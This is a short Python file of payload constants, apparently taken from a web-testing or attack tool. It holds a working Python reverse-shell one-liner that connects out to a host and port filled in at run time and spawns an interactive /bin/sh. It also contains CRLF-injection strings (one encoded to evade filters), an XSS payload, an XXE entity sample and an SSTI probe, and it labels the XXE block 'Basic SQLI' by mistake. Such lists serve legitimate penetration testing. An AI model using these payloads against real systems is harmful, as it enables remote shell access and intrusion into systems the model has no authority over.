

pyshell = (
	"python -c 'import socket,subprocess,os;"
	"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
	"s.connect((\"{}\",{}));os.dup2(s.fileno(),0);"
	"os.dup2(s.fileno(),2);"
	"os.dup2(s.fileno(),1);"
	"p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
)

CRLF = "\r\n"

CRLF8 ="%E5%98%8A%E5%98%8D"

## Basic XSS
XSS = "a\"><script>alert(0)</script>\""

## Basic SQLI
XXE = """<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
	<userInfo>
		<firstName>John</firstName>
		<lastName>&example;</lastName>
	</userInfo>
"""

## Server-Side Template injection (SSTI)
SSTI = "{2*2}"